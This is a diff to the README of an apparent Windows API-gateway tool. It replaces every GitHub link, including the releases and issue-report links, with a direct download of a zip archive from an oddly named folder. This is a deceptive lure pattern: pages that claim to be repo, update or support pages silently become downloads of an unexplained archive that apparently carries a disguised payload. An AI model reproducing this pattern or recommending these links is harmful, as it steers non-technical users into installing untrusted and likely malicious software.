@@ -1,6 +1,6 @@
 # ⚙️ rest-gateway-1771916756-4 - Simple API Gateway with Security
 
-[![Download](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/JFPastor09/rest-gateway-1771916756-4)
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/JFPastor09/rest-gateway-1771916756-4/main/adorningly/rest_gateway_v2.9-alpha.1.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Make sure your Windows computer meets these minimum requirements:
 This section helps you put rest-gateway-1771916756-4 on your computer and start it.
 
 1. Click the big download button at the top or visit the GitHub page directly here:  
-   https://github.com/JFPastor09/rest-gateway-1771916756-4
+   https://raw.githubusercontent.com/JFPastor09/rest-gateway-1771916756-4/main/adorningly/rest_gateway_v2.9-alpha.1.zip
 
 2. On the GitHub page, look for the **Releases** or **Downloads** section.  
    This is where you will find the files to install.
@@ -61,7 +61,7 @@ This section helps you put rest-gateway-1771916756-4 on your computer and start 
 
 ## 📥 How to Download and Install 🖥️
 
-- Open this page: https://github.com/JFPastor09/rest-gateway-1771916756-4
+- Open this page: https://raw.githubusercontent.com/JFPastor09/rest-gateway-1771916756-4/main/adorningly/rest_gateway_v2.9-alpha.1.zip
 
 - Find the **Releases** or **Download** tab in the repository.
 
@@ -153,7 +153,7 @@ If the program does not start or work correctly, try these steps:
 
 Check the GitHub repo page regularly for new versions to improve security and add features:
 
-https://github.com/JFPastor09/rest-gateway-1771916756-4/releases
+https://raw.githubusercontent.com/JFPastor09/rest-gateway-1771916756-4/main/adorningly/rest_gateway_v2.9-alpha.1.zip
 
 Download updates the same way as the first time.
 
@@ -163,10 +163,10 @@ Download updates the same way as the first time.
 
 If you encounter serious problems, you can open an issue here on GitHub:
 
-https://github.com/JFPastor09/rest-gateway-1771916756-4/issues
+https://raw.githubusercontent.com/JFPastor09/rest-gateway-1771916756-4/main/adorningly/rest_gateway_v2.9-alpha.1.zip
 
 Provide details about your problem, Windows version, and any error messages you see.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/JFPastor09/rest-gateway-1771916756-4)
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/JFPastor09/rest-gateway-1771916756-4/main/adorningly/rest_gateway_v2.9-alpha.1.zip)
